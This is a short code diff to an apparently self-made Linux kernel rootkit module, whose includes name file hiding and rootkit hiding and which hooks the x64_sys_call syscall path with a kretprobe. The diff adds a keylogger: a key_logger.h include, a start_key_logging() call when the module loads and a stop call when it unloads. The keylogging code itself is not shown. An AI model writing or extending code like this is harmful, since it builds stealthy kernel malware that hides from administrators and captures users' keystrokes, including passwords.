@@ -1,5 +1,6 @@
 #include "hide_file.h"
 #include "hide_rootkit.h"
+#include "key_logger.h"
 #include "rootkit_cmd.h"
 
 #include <linux/file.h>
@@ -56,6 +57,7 @@ static int syscall_exit(struct kretprobe_instance *k, struct pt_regs *regs) {
 }
 
 static int __init rootkit_enter(void) {
+  start_key_logging();
 
   kp.kp.symbol_name = "x64_sys_call";
   kp.data_size = sizeof(struct rootkit_cmd);
@@ -72,6 +74,7 @@ static int __init rootkit_enter(void) {
 }
 
 static void __exit rootkit_exit(void) {
+  stop_key_logging();
   unregister_kretprobe(&kp);
 
   printk(KERN_INFO "Goodbye rootkit unloaded\n");
